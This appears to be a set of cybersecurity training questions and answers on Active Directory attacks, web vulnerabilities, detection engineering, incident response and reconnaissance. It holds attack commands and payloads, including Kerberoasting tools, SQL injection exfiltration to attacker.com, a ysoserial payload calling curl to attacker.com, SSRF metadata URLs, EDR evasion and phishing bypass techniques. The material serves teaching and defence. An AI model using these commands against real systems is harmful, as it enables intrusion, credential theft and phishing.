Kerberos authentication flow in Active Directory: (1) Client sends AS-REQ to KDC (Domain Controller) with timestamp encrypted with user's password hash. (2) KDC returns AS-REP containing TGT (Ticket Granting Ticket) encrypted with the KDC's krbtgt hash, and a session key encrypted with the user's key. (3) Client presents TGT in TGS-REQ to request a service ticket for a target SPN (Service Principal Name). (4) KDC returns TGS-REP: a service ticket encrypted with the service account's password hash, plus session key for communicating with the service. (5) Client presents ticket to service in AP-REQ; service decrypts with its own hash. Kerberoasting: any authenticated domain user can request service tickets for any SPN. The ticket is encrypted with the service account's NT hash. Attacker exports the ticket (Invoke-Kerberoast, impacket GetUserSPNs.py -request -dc-ip DC -output tickets.txt DOMAIN/user:pass) and cracks offline (hashcat -m 13100 tickets.txt wordlist.txt). High-value SPNs: SQL service accounts, IIS app pools, backup agents. Mitigation: use gMSA (Group Managed Service Accounts -- 120-char random passwords, auto-rotated); AES-only encryption for Kerberos; monitor TGS-REP requests in event log 4769 with RC4 encryption type from non-service accounts.
What is AS-REP Roasting and when does it work?

AS-REP Roasting targets accounts with the 'Do not require Kerberos preauthentication' flag set (UF_DONT_REQUIRE_PREAUTH). Normally, Kerberos requires the client to encrypt a timestamp with the user's key in the AS-REQ, proving knowledge of the password before the KDC issues a TGT. When preauthentication is disabled, the KDC issues an AS-REP without verifying identity first. The AS-REP contains the TGT session key encrypted with the user's NT hash -- this can be cracked offline. Attack: impacket GetNPUsers.py DOMAIN/ -no-pass -usersfile users.txt -format hashcat produces $krb5asrep$23$... hashes. hashcat -m 18200 to crack. Finding vulnerable accounts: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}. Service accounts, legacy applications, and misconfigured accounts often have this set. Mitigation: enable preauthentication for all accounts; use AES encryption; monitor event 4768 (AS requests) without preauthentication (encryption type 0x17 = RC4).
Explain common cryptographic attacks with practical examples.

Key cryptographic attacks: (1) Padding oracle -- CBC mode decryption: if server reveals whether PKCS7 padding is valid, attacker iterates byte values for each ciphertext block to recover plaintext without the key; 128 requests per block on average. Tools: padbuster, POET. (2) Bit-flipping in CBC -- XOR attacker-controlled ciphertext block C[i-1] with known plaintext and desired plaintext to forge plaintext in block C[i] without key knowledge; used to flip boolean flags in encrypted cookies. (3) ECB mode block reordering -- ECB encrypts each 16-byte block independently; if two plaintext blocks are identical, their ciphertexts are identical; blocks can be rearranged to forge messages (block oracle attack). (4) Hash length extension -- SHA-1/SHA-256/MD5 Merkle-Damgard construction: given H(secret || message) and len(secret), compute H(secret || message || padding || extension) without knowing secret; use hashpump. (5) RSA small public exponent with no padding -- if e=3 and plaintext^3 < modulus, compute cube root directly. (6) Bleichenbacher's attack on RSA PKCS#1 v1.5 -- adaptive chosen-ciphertext attack against SSL/TLS; ROBOT attack (2017) showed it still affected major vendors. (7) Timing attacks -- non-constant-time comparison of HMACs; use hmac.compare_digest() in Python.
Explain TLS handshake and common TLS attacks.

TLS 1.3 handshake (simplified): (1) Client Hello: TLS version, random, cipher suites, key shares (Diffie-Hellman public values). (2) Server Hello: chosen cipher, key share, certificate. (3) Server sends Certificate, CertificateVerify (signature over handshake transcript). (4) Client verifies certificate chain (CA trust, hostname, revocation). (5) Both derive session keys from shared DH secret + random values. (6) Application data encrypted with symmetric key (AEAD cipher: AES-GCM or ChaCha20-Poly1305). Historic attacks (TLS 1.0/1.1/1.2): BEAST (CBC IV predictability in TLS 1.0); CRIME/BREACH (HTTP compression oracle on TLS stream); POODLE (padding oracle in SSLv3/TLS with CBC fallback); DROWN (SSLv2 oracle); FREAK (forced RSA export key exchange); Logjam (weak DH parameters downgrade to 512-bit export). Modern attacks: certificate transparency log monitoring for misissued certs; ALPN negotiation downgrade; weak cipher negotiation via stripping ClientHello options (MITM). Testing: testssl.sh, nmap --script ssl-enum-ciphers; ssllabs.com scanner checks for all historic vulnerabilities.
What is a threat model and how do you build one for a web application?

Threat modelling systematically identifies threats before they are exploited. Process: (1) Decompose the system -- create a DFD (Data Flow Diagram) showing: external entities (users, third-party APIs), processes (application servers, auth service), data stores (database, cache, S3), and data flows (HTTP requests, DB queries, queue messages). Mark trust boundaries (internet/DMZ/internal). (2) Apply STRIDE per component: Spoofing (authentication bypass), Tampering (data modification), Repudiation (deny actions), Information Disclosure (data leakage), Denial of Service, Elevation of Privilege. For each element ask: can an attacker spoof this? tamper with data in transit? etc. (3) Rate threats by DREAD (Damage, Reproducibility, Exploitability, Affected users, Discoverability) or CVSS. (4) Define mitigations per threat: input validation, parameterised queries, TLS, RBAC, rate limiting, WAF rules, MFA. (5) Document residual risks. Tools: OWASP Threat Dragon, Microsoft Threat Modeling Tool (STRIDE diagrams), threagile (code-based threat models). Output: threat register with threat/component/mitigation/owner/status. Revisit on every major architecture change.
Explain OWASP Top 10 2021 with exploitation and mitigation for each.

OWASP Top 10 2021: A01 Broken Access Control -- IDOR, force-browsing, missing function-level auth; mitigation: deny-by-default, per-object authorisation checks, log failures. A02 Cryptographic Failures -- weak algorithms (MD5, SHA1, DES, RC4), unencrypted PII, weak key sizes; mitigation: TLS 1.2+, AES-256-GCM, bcrypt/Argon2 for passwords, no secrets in source. A03 Injection -- SQLi, LDAP injection, OS command injection, XSS, XXE; mitigation: parameterised queries, allowlist input validation, encode output for context. A04 Insecure Design -- missing threat model, business logic flaws; mitigation: threat modelling, security requirements, abuse cases. A05 Security Misconfiguration -- default credentials, verbose errors, unnecessary features enabled, cloud storage public; mitigation: hardening guides, IaC scanning, automated config audit. A06 Vulnerable and Outdated Components -- unpatched libraries, EOL software; mitigation: SCA tools (Dependabot, Snyk), SBOM. A07 Identification and Authentication Failures -- weak passwords, credential stuffing, broken session management; mitigation: MFA, breached password checks, secure session cookies. A08 Software and Data Integrity Failures -- unsigned updates, insecure deserialization, CI/CD pipeline compromise; mitigation: signature verification, secure deserialization libraries, SLSA framework. A09 Security Logging and Monitoring Failures -- no logs for auth failures, no alerting; mitigation: structured logging, SIEM integration, incident response playbooks. A10 SSRF -- attacker forces server to make requests to internal resources; mitigation: allowlist of allowed destination IPs, block metadata endpoints.
What does a secure CI/CD pipeline look like?

Secure CI/CD pipeline controls: (1) Source control security -- branch protection (require PR reviews, status checks, signed commits); secret scanning (GitHub Advanced Security / gitleaks prevents committing credentials). (2) Dependency management -- SCA (Software Composition Analysis) on every build: Snyk, OWASP Dependency-Check, Dependabot; block builds with critical CVEs in dependencies. (3) SAST (Static Application Security Testing) -- Semgrep, CodeQL, Checkmarx scan source on every PR; enforce no new high findings. (4) Container scanning -- Trivy, Grype, Snyk Container scan Docker images for OS and library CVEs; scan base image and final image. (5) IaC scanning -- Checkov, tfsec, cfn-nag scan Terraform/CloudFormation/K8s manifests for misconfigurations (public S3, no encryption, overprivileged IAM). (6) Secrets management -- no secrets in code or environment variables; use Vault, AWS Secrets Manager, or GCP Secret Manager; short-lived credentials via OIDC for CI/CD. (7) Artifact signing -- sigstore/cosign signs container images; verify signatures at deployment. (8) DAST in staging -- OWASP ZAP, Burp Suite DAST scan running application. (9) Least-privilege service accounts for CI runners. (10) Audit logs for all pipeline runs and artifact publishes. SLSA (Supply-chain Levels for Software Artifacts) framework provides a maturity model.
Explain software supply chain attacks and defences.

Software supply chain attacks compromise software before it reaches end users. Attack categories: (1) Dependency confusion / namespace squatting -- attacker publishes a public package with the same name as an internal private package at a higher version number; pip/npm/gem prefers the public registry. (2) Typosquatting -- publish packages with names similar to popular libraries (requests vs request, numpy vs num-py). (3) Compromised maintainer account -- SolarWinds: attackers compromised the build pipeline (SUNSPOT malware injected SUNBURST into Orion builds). (4) Malicious commits -- direct code changes to open-source repos with stolen maintainer credentials. (5) Malicious CI workflow injection -- attacker creates a PR that modifies GitHub Actions workflow to exfiltrate secrets. (6) Build system compromise -- XZ Utils 2024: social engineering gained maintainer trust over years, then injected backdoor into release tarball. Defences: (1) Pin dependencies to exact versions and hashes (requirements.txt with hashes, package-lock.json). (2) Use private mirrors (Artifactory, Nexus) with allowlisted packages. (3) SBOM (Software Bill of Materials) to track all dependencies. (4) Code signing and reproducible builds. (5) SLSA Level 3+: build from source, provenance attestation. (6) Runtime detection (abnormal network connections from build agents).
What Windows Event IDs are critical for security monitoring?

Critical Windows Event IDs: Authentication: 4624 (successful logon -- check logon type: 3=network, 10=remote interactive), 4625 (failed logon -- track lockouts), 4648 (explicit credentials used -- runas, PtH indicator), 4768/4769 (Kerberos TGT/service ticket -- Kerberoasting: 4769 with encryption type 0x17), 4771 (Kerberos pre-auth failure). Privilege/escalation: 4672 (special privileges assigned -- admin logon), 4673 (privileged service called), 4698/4702 (scheduled task created/modified), 4720/4722/4732 (account created/enabled/added to group). Process: 4688 (process creation -- requires audit policy; enable with command line logging for full visibility), 4689 (process exit). Object access: 4663 (file access -- requires SACL on object), 4656 (handle requested). Policy: 4719 (audit policy changed -- attackers disable logging), 1102 (audit log cleared), 7045 (new service installed). PowerShell: 4103/4104 (module/script block logging -- captures de-obfuscated PowerShell). Lateral movement: 4778 (session reconnected), 5140 (network share accessed). Correlate 4625 (many failures) + 4624 (success) = brute force. Multiple 4769 RC4 requests = Kerberoasting. 4688 with powershell + encoded command = suspicious.
How do you build a detection rule for a specific attacker technique?

Detection engineering process for, e.g., detecting LSASS credential dumping: (1) Understand the technique -- LSASS (Local Security Authority Subsystem Service, PID varies) is targeted by mimikatz, procdump, Task Manager dump. Methods: OpenProcess(PROCESS_VM_READ, lsass_pid), MiniDumpWriteDump(), or direct syscall alternatives. (2) Identify observables -- Windows Event 4656 (handle to lsass requested with PROCESS_VM_READ + PROCESS_VM_OPERATION), 10 (Sysmon process access to lsass.exe), file creation events for.dmp files, network connections from lsass. (3) Write detection logic (Sigma rule format):
```yaml
title: LSASS Memory Access
logsource:
 product: windows
 category: process_access
detection:
 selection:
 TargetImage|endswith: '\lsass.exe'
 GrantedAccess|contains:
 - '0x1010'
 - '0x1410'
 - '0x147a'
 - '0x143a'
 filter:
 SourceImage|endswith:
 - '\MsMpEng.exe'
 - '\WerFault.exe'
 condition: selection and not filter
```
(4) Test against real attack telemetry and legitimate baseline. (5) Tune to reduce false positives. (6) Convert to SIEM query (Splunk SPL, Elastic EQL, Microsoft KQL). (7) Document: technique reference (MITRE T1003.001), severity, response playbook. (8) Monitor for rule effectiveness (true positive rate, false positive rate).
Explain the threat intelligence lifecycle and how to operationalise it.

Threat intelligence lifecycle: (1) Planning and direction -- define intelligence requirements (PIRs): what threats are relevant to our industry? Which APT groups target our sector? What TTPs should our detections cover? (2) Collection -- sources: OSINT (VirusTotal, Shodan, CIRCL, MISP communities, social media, threat actor forums), commercial feeds (Recorded Future, Mandiant, CrowdStrike Intel), government (CISA advisories, FBI flash, ISAC), technical (log data, malware samples from sandboxes). (3) Processing -- normalise IOCs (IPs, domains, hashes, URLs) to STIX format; deduplicate; score confidence and severity; check against whitelist (avoid false positives from CDN IPs). (4) Analysis -- cluster IOCs into campaigns; attribute to threat actor groups using TTP overlap with MITRE ATT&CK; assess adversary capability, intent, and targeting. (5) Dissemination -- tactical (raw IOCs to SIEM/EDR for blocking); operational (TTP reports to detection engineers for rule creation); strategic (executive threat landscape reports). (6) Feedback -- measure true positive rate of IOC-based detections; retire stale indicators; request new intelligence requirements based on gaps. Platforms: MISP (sharing), OpenCTI (analysis), ThreatConnect, Anomali ThreatStream.
Walk through a complete incident response process for a ransomware attack.

Ransomware IR process: (1) Detection and triage -- alert from EDR (mass file encryption, shadow copy deletion via vssadmin), AV detection, or user report. Assign severity P1. Activate IR team. (2) Containment -- immediately isolate affected hosts (remove from network, not power off -- preserve volatile memory). Block C2 IPs/domains at firewall. Disable affected user accounts. Isolate network segments if lateral movement detected. (3) Evidence preservation -- image disk (dd or FTK Imager) and capture memory (Magnet RAM Capture, WinPmem) before any remediation. Preserve logs: Windows Event Logs, PowerShell logs, EDR telemetry, DNS logs, proxy logs. (4) Investigation -- determine patient zero (earliest encrypted file timestamp, earliest malicious process); trace lateral movement path (logon events, SMB access); identify data exfiltration (large outbound transfers pre-encryption); determine ransomware family (Emsisoft Decryption Tools database, nomoreransom.org). (5) Eradication -- remove malware persistence (scheduled tasks, registry run keys, services, GPO backdoors); patch exploited vulnerability; reset all credentials (domain admin, service accounts). (6) Recovery -- restore from offline backups (verify backup integrity before restore); test restored systems before reconnecting. (7) Post-incident -- write incident report; update detection rules to catch TTPs used; brief stakeholders; notify relevant authorities (FBI IC3, CISA, data protection authorities if PII involved).
What are the key artefacts for Windows memory forensics?

Windows memory forensics with Volatility3: key plugins and artefacts: (1) Process enumeration -- windows.pslist (linked list -- rootkits may unlink processes), windows.pstree (parent-child relationships), windows.psscan (scan physical memory for EPROCESS structures -- finds hidden processes). (2) Network connections -- windows.netstat (active TCP/UDP, includes closed connections still in memory). (3) Injected code -- windows.malfind (find executable memory regions in non-image-backed regions -- VAD anomalies: private memory with PAGE_EXECUTE_READWRITE not backed by a file). (4) DLL analysis -- windows.dlllist (loaded DLLs per process), windows.ldrmodules (cross-reference three PEB lists; unlisted DLLs are reflectively loaded). (5) Handles -- windows.handles (open files, registry keys, mutexes -- mutex names are malware fingerprints). (6) Registry -- windows.registry.hivelist (loaded hives), windows.registry.printkey (read specific keys). (7) Credential theft -- windows.lsadump (cached credentials if SYSTEM context available). (8) Command history -- windows.cmdline (process command lines), windows.consoles (console input/output buffers -- recent commands). (9) Kernel rootkits -- windows.ssdt (SSDT hooks), windows.callbacks (kernel callbacks registered by drivers). Workflow: acquire memory -> run windows.info to confirm profile -> investigate suspicious processes with pstree -> malfind on suspicious processes -> dump process with windows.dumpfiles -> analyse dump in x64dbg or Ghidra.
Explain CVSS scoring and its limitations for vulnerability prioritisation.

CVSS v3.1 Base Score components: Attack Vector (Network/Adjacent/Local/Physical); Attack Complexity (Low/High); Privileges Required (None/Low/High); User Interaction (None/Required); Scope (Unchanged/Changed -- can the vuln impact other components?); Confidentiality/Integrity/Availability Impact (None/Low/High). Formula produces 0-10 score: Critical 9-10, High 7-8.9, Medium 4-6.9, Low <4. Temporal metrics adjust for exploit maturity and remediation. Environmental metrics adjust for asset criticality and security controls. CVSS limitations: (1) Base score ignores exploitability in the wild (a 9.8 with no public exploit is less urgent than a 7.0 being actively exploited). (2) Base score ignores asset context (a Critical on an internet-facing auth service is more urgent than the same CVE on an isolated dev box). (3) Treats all networks as equal (AV:N on an air-gapped system is moot). Better approach: EPSS (Exploit Prediction Scoring System) gives probability of exploitation within 30 days based on NVD data, social media chatter, proof-of-concept availability. SSVC (Stakeholder-Specific Vulnerability Categorisation) combines exploitability, technical impact, and mission criticality. KEV (CISA Known Exploited Vulnerabilities catalog) is the authoritative list of actively exploited CVEs requiring immediate remediation (CISA BOD 22-01 mandates federal agencies patch KEV entries within 2 weeks).
How do you run an effective vulnerability scanning programme?

Effective vulnerability scanning programme: (1) Asset inventory -- you cannot scan what you do not know exists; maintain a CMDB (ServiceNow, Armis for IoT) or derive inventory from cloud APIs and network discovery. (2) Scanning architecture -- credentialed scans (using service account) give 10x more findings than unauthenticated scans (access to installed software inventory); deploy scanners in each network segment (NAT and firewall prevent remote scanning). Tools: Tenable Nessus/Security Center, Qualys VMDR, Rapid7 InsightVM. (3) Scan frequency -- internet-facing assets: daily; internal critical: weekly; internal standard: monthly; development/test: on-deployment. (4) Coverage metrics -- track scan coverage (% of assets scanned in last 30 days); target >95%. (5) Prioritisation -- use EPSS + CVSS + asset criticality + exploit availability; prioritise KEV entries above all others. (6) SLA -- define remediation SLAs per severity: Critical 48h (KEV 24h), High 7 days, Medium 30 days, Low 90 days. (7) Exceptions -- document accepted risks with risk owner sign-off, compensating controls, and expiry date. (8) Metrics -- mean time to remediate (MTTR) per severity; age distribution of open vulns; trend over time. (9) Integration -- pipe findings to Jira for ticketing; integrate scanner with CI/CD to block deployments with new Criticals.
Walk through a complete external penetration test methodology.

External penetration test methodology: (1) Reconnaissance (passive) -- whois/RDAP for registrant info and IP ranges; ARIN/RIPE for IP blocks; Certificate Transparency (crt.sh) for subdomains; Shodan/Censys for internet-exposed services; LinkedIn/Hunter.io for email patterns and employee names; Google dorks (site:target.com filetype:pdf inurl:admin); job postings revealing tech stack; GitHub org search for leaked credentials. (2) Reconnaissance (active) -- DNS enumeration: amass enum -d target.com; subfinder; dnsx to resolve; masscan on discovered IPs for top 100 ports; nmap -sV -sC on interesting hosts. (3) Vulnerability identification -- web app: Nikto, nuclei (3000+ templates for known CVEs), manual testing; infrastructure: nmap --script vuln; look for default credentials (shodan screenshots), unpatched services, exposed admin panels. (4) Exploitation -- exploit identified vulnerabilities: SQLi with sqlmap; RCE via CVE PoC; default credentials; weak SSL/TLS configurations; broken auth. (5) Post-exploitation -- demonstrate impact: read sensitive files, access internal hosts, capture credentials. (6) Lateral movement (if in scope) -- pivot from DMZ to internal via discovered credentials or additional vulnerabilities. (7) Documentation -- report: executive summary, technical findings with CVSS scores, reproduction steps with screenshots, remediation recommendations. Deliverables: report within 5 business days post-testing, debrief call with technical team.
Explain SQL injection types and advanced exploitation techniques.

SQL injection types: (1) Classic (in-band) -- error-based: trigger DB error revealing data (e.g., CONVERT(int, (SELECT table_name FROM information_schema.tables))); union-based: UNION SELECT null,username,password FROM users-- appends attacker query to original. (2) Blind -- boolean-based: condition changes application response (1=1 vs 1=2); time-based: SLEEP(5) or WAITFOR DELAY '0:0:5' delays response if condition is true -- extract data bit by bit. (3) Out-of-band (OOB) -- DNS/HTTP callback: in MySQL: LOAD_FILE('\\\\attacker.com\\file'); in MSSQL: EXEC xp_dirtree '\\attacker.com\file'; sends credentials to attacker. Advanced techniques: second-order injection (payload stored then executed later in a different context); WAF bypass (comment obfuscation: SEL/**/ECT, URL encoding, case variation, using || concatenation in Oracle, whitespace alternatives 	 
); schema enumeration via information_schema.tables/columns; reading files (MySQL LOAD_FILE, INTO OUTFILE); OS command execution (MSSQL xp_cmdshell 'whoami'; MySQL UDF with lib_mysqludf_sys). sqlmap flags: --dbms, --level 5 --risk 3 (aggressive), --technique=BEUS, --os-shell (attempts xp_cmdshell/UDF), --file-read/write. Mitigation: parameterised queries; stored procedures with parameters (not concatenation); least-privilege DB account; WAF as defence-in-depth.
How does Server-Side Request Forgery work and what can be achieved with it?

SSRF forces the server to make HTTP/S or other protocol requests to attacker-controlled destinations. The server acts as a proxy from the internal network. Impact: (1) Cloud metadata -- AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE yields IAM credentials. GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token with Metadata-Flavor:Google header. Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 with Metadata:true. (2) Internal service enumeration -- scan internal network (192.168.0.0/16) for HTTP services; access Redis (http://redis:6379 with RESP commands via Gopher protocol); access Elasticsearch; reach internal admin panels. (3) SSRF to RCE -- Gopher protocol sends arbitrary TCP data: exploit Redis SLAVEOF to write SSH key, Memcached command injection, internal Kubernetes API server. (4) Blind SSRF -- no response body reflected but DNS/HTTP callbacks to Burp Collaborator confirm connectivity to internal hosts. Bypass techniques: DNS rebinding (domain resolves to external IP on first lookup, internal IP on second); IPv6 (::1 for localhost); URL encoding; decimal IP notation (2130706433 = 127.0.0.1); URL scheme variations (dict://, gopher://, file://). Mitigation: server-side allowlist of allowed URLs/IPs; disable unused URL schemes; block metadata IP (169.254.169.254) in firewall and application; use IMDSv2 (session-token required).
Explain insecure deserialisation and how to build a ysoserial payload.

Insecure deserialisation occurs when applications deserialise untrusted data without validating it, allowing attackers to modify serialised objects or supply malicious ones that trigger code execution during the deserialisation process. Java: Java's ObjectInputStream.readObject() will instantiate arbitrary classes present in the classpath and execute their readObject() methods. Gadget chains abuse classes that execute OS commands when deserialised (e.g., CommonsCollections gadgets: InvokerTransformer calls Runtime.exec() via reflection). ysoserial generates payloads: java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/$(whoami)' | base64. Deliver base64 payload in the deserialised field. Python: pickle.loads() executes __reduce__ returning (os.system, ('cmd',)) -- never unpickle untrusted data. PHP: unserialize() triggers __wakeup(), __destruct() magic methods; POP chain gadgets in popular frameworks (Laravel, Symfony, Magento)..NET: BinaryFormatter deserialises attacker-controlled objects; ViewState in ASP.NET if MachineKey is known (Blacklist3r recovers keys from leaked config). Detection: look for base64-encoded Java serialised object signatures (rO0AB -- aced 0005 in hex) in HTTP parameters, cookies, and message queues. Mitigation: never deserialise untrusted data; use data-only formats (JSON, Protobuf); if deserialisation is required, use allowlisting (ObjectInputFilter in Java 9+; not signature-based, but class-based).
How does EDR (Endpoint Detection and Response) work and how do attackers evade it?

EDR collects and analyses endpoint telemetry: process creation (with command lines), file creation/modification, registry changes, network connections, module loads, and memory allocations. Architecture: kernel driver (minifilter driver for file system, process/thread/image-load callbacks, network filter driver) sends events to user-mode service which sends to cloud analytics. Detection methods: (1) Signature-based -- file hash matching against known malware. (2) Behavioral -- process injection patterns, LSASS access, suspicious parent-child relationships (Word.exe spawning cmd.exe). (3) ML models -- classify process trees and memory patterns. (4) Threat intelligence -- IOC matching (known bad IPs, domains, hashes). Evasion techniques: (1) Direct syscalls -- bypass userland API hooks by calling syscalls directly (Syswhispers, Hells Gate -- dynamically resolve syscall numbers); EDR hooks NtOpenProcess etc in ntdll.dll, but direct syscalls skip those hooks. (2) BYOVD (Bring Your Own Vulnerable Driver) -- load a legitimate signed but vulnerable kernel driver; exploit it to run kernel code with no EDR visibility; Lapsus$/RansomHub have used this. (3) Process hollowing / module stomping -- overwrite legitimate process memory to hide payload. (4) Parent PID spoofing -- make malicious process appear as a child of explorer.exe. (5) Indirect syscalls -- proxy syscalls through legitimate ntdll code. (6) ETW patching -- disable telemetry collection. (7) Living off the land -- use built-in Windows tools (certutil, mshta, regsvr32) to avoid PE drops.
Explain firewall evasion techniques used in penetration testing.

Firewall evasion during penetration testing: (1) Fragment packets -- nmap -f fragments IP packets; many stateful firewalls reassemble before inspection but some don't; also bypasses simple ACL-based firewalls checking port numbers in first fragment only. (2) Decoy scans -- nmap -D RND:10 sends probes from random spoofed source IPs mixed with real probe; logs show many apparent sources, obscuring true scanner. (3) Source port manipulation -- nmap --source-port 53 or --source-port 443; some firewall rules allow traffic from these ports. (4) Slow scan -- nmap -T0 (paranoid) spreads packets over hours, below IDS detection thresholds; --scan-delay 60000ms. (5) MTU manipulation -- nmap --mtu 8 sets custom MTU; fragments packets into 8-byte chunks. (6) Protocol evasion -- if ICMP is allowed, ICMP tunneling (ptunnel); if UDP/53 is allowed, DNS tunneling (dnscat2, iodine); if HTTP is allowed, HTTP C2 (Cobalt Strike HTTPS beacon). (7) IPv6 -- many firewalls have weaker IPv6 rules; test with nmap -6. (8) Application-layer tunneling -- SSH tunneling through allowed port 443; TLS over port 80; HTTP CONNECT proxy method. (9) Covert channels -- encoding data in TCP timestamp option, IP ID field, ICMP data.
Explain email authentication mechanisms and how to bypass them for phishing.

Email authentication stack: SPF (Sender Policy Framework) -- domain TXT record lists authorised sending IPs; receiving MTA checks if sending IP is in the SPF record of the From domain. DKIM (DomainKeys Identified Mail) -- sending server signs message headers with private key; receiving server verifies against public key in DNS. DMARC (Domain-based Message Authentication, Reporting, Conformance) -- policy saying what to do if SPF/DKIM fails (none/quarantine/reject) and specifying alignment (the From header must match the authenticated domain). DMARC requires both SPF and DKIM to pass with alignment to protect against From: header spoofing. Bypass techniques: (1) Lookalike domains -- register paypa1.com, paypal-secure.com; these have valid SPF/DKIM so DMARC passes. (2) Subdomain spoofing -- if DMARC policy only covers the organisational domain, subdomains without DMARC records may be spoofable. (3) SPF softfail (~all) -- returns soft fail, many MTAs still deliver. (4) PunyCode homoglyph -- IDN homograph attack: pаypal.com (Cyrillic а) vs paypal.com; appears identical to users. (5) Sender name spoofing (display name) -- From: PayPal Security <attacker@gmail.com>; many email clients show only the display name. (6) Compromised legitimate account -- bypass all technical controls by sending from a real account (BEC attack). (7) HTML smuggling -- evade email gateway scanning by building malicious payload in JavaScript after delivery.
What is Zero Trust Architecture and how do you implement it?

Zero Trust rejects the implicit trust model (trust if inside the network) and requires continuous verification for every access request regardless of network location. Core principles (NIST SP 800-207): (1) All resources are treated as external; (2) All communication is secured regardless of location; (3) Access is granted per-session with least privilege; (4) Resource integrity and security posture are verified dynamically; (5) Authentication and authorisation are dynamic and strictly enforced; (6) Maximum information collected to improve security posture. Implementation pillars: Identity -- MFA for all users; passwordless (FIDO2); continuous identity risk scoring (risky sign-in detection). Devices -- MDM enrollment; device compliance check before resource access; certificate-based auth. Network -- microsegmentation (deny by default between workloads); ZTNA (Zero Trust Network Access) replaces VPN -- application-specific access, not network-level. Applications -- CASB (Cloud Access Security Broker) for SaaS visibility; app-level RBAC; API gateway. Data -- data classification; DLP; encryption at rest and in transit. Visibility -- SIEM/SOAR for all access events; anomaly detection. Implementation path: (1) Map sensitive data flows; (2) Deploy MFA and identity governance; (3) Implement device compliance checks; (4) Replace VPN with ZTNA for remote access; (5) Microsegment crown-jewel systems; (6) Instrument everything with logging. Vendors: Microsoft Entra + Defender (full MSFT stack), Zscaler (network), Okta/BeyondTrust (identity), Illumio (microsegmentation).
What OSINT sources give the most value during external recon on a target company?

Highest-value OSINT sources: (1) Certificate Transparency logs -- crt.sh, censys certificate search; enumerate ALL subdomains that have ever had a TLS certificate (includes dev, staging, internal apps exposed externally). (2) Shodan/Censys/FOFA -- internet scan data showing exposed ports, banners, SSL cert subjects, software versions; search: org:"Target Inc" or ssl:"target.com". (3) GitHub / GitLab -- search organisation name, email domain, product names for leaked credentials, API keys, internal hostnames, config files; use dorks: 'org:targetorg password' or GitHub Advanced Search; truffleHog / gitleaks scan repos. (4) LinkedIn -- enumerate employees (names, roles, tech skills signal tech stack); tools like linkedin2username generate email lists. (5) Job postings -- reveal tech stack ('experience with Splunk, Terraform, AWS EKS, Vault'); identify security gaps ('seeking first SIEM engineer'). (6) DNS records -- dnsx, dnsdumpster, SecurityTrails; MX records reveal email providers; NS records identify registrar; TXT records expose SPF/DKIM/DMARC, Google/Microsoft verification tokens (confirm cloud usage), third-party services. (7) WHOIS / ARIN RDAP -- ASN number leads to full IP range of organisation; reverse WHOIS on registrant email uncovers related domains. (8) Wayback Machine -- archived pages of decommissioned apps, old API endpoints, old login pages. (9) Google dorks: site:target.com filetype:xlsx OR filetype:pdf; site:target.com inurl:login; site:target.com 'not for public'; 'target.com' ext:env OR ext:bak. (10) Breach databases -- HaveIBeenPwned API, DeHashed for leaked credentials of employees (email:password combos for password spray).
How do you perform passive subdomain enumeration at scale?

Passive subdomain enumeration without touching the target: (1) Certificate transparency -- curl 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value' | sed 's/\*//' | sort -u. Censys API: search certificates with parsed.names:target.com. (2) DNS aggregator databases -- SecurityTrails API (comprehensive historical DNS), PassiveTotal (RiskIQ), VirusTotal (search domain reports), CIRCL PDNS. (3) Web archives -- Wayback Machine CDX API: http://web.archive.org/cdx/search/cdx?url=*.target.com&output=json&fl=original&collapse=urlkey. (4) Search engines -- Google: site:target.com; Bing: domain:target.com; they index pages on subdomains not in CT logs. (5) DNS bruteforce (semi-passive) -- puredns bruteforce target.com -w best-dns-wordlist-1m.txt --resolvers resolvers.txt; resolves against public resolvers only, no direct target contact. (6) ASN-derived ranges -- bgp.he.net shows ASN; amass intel -asn 12345 enumerates IPs and hostnames. (7) Github/Gitlab search -- grep source code for internal hostnames. (8) Aggregation tools -- amass enum -passive -d target.com (queries 40+ sources); subfinder -d target.com (queries 80+ sources); run both and merge. Post-collection: dnsx -l subdomains.txt -a -resp to resolve and find live hosts; httpx -l live-subs.txt -status-code -title -tech-detect to fingerprint web applications.
Explain Google dorking techniques for finding exposed sensitive content.

Advanced Google dork patterns: (1) Exposed credentials and config: site:target.com ext:env | ext:yaml | ext:json | ext:xml; site:target.com 'DB_PASSWORD' | 'AWS_SECRET' | 'api_key'; site:github.com 'target.com' 'password'. (2) Admin and login pages: site:target.com inurl:admin | inurl:login | inurl:dashboard | inurl:cpanel | inurl:wp-admin. (3) Exposed files: site:target.com filetype:xlsx | filetype:csv | filetype:pdf 'confidential'; site:target.com filetype:log; site:target.com filetype:sql. (4) Directory listings: site:target.com intitle:'index of' | intitle:'directory listing'. (5) Error messages revealing internals: site:target.com 'ORA-' | 'MySQL error' | 'Traceback (most recent call last)' | 'stack trace'. (6) VPN and remote access: site:target.com inurl:vpn | inurl:remote | inurl:citrix | inurl:rdweb. (7) API endpoints: site:target.com inurl:api | inurl:v1 | inurl:v2 | inurl:swagger | inurl:graphql. (8) Network equipment: intitle:'RouterOS' | intitle:'Cisco' inurl:login site:target.com. (9) Document metadata: download target PDFs and XLSDs; exiftool reveals author names (map to AD usernames), software versions, internal paths. (10) Shodan dorks: org:'Target Inc' port:22,3389,5432,6379,27017 -- exposed SSH, RDP, Postgres, Redis, MongoDB; title:'Login' org:'Target Inc'; html:'X-Powered-By: PHP/5' org:'Target Inc' (old PHP).
How do you use Shodan effectively for attack surface mapping?

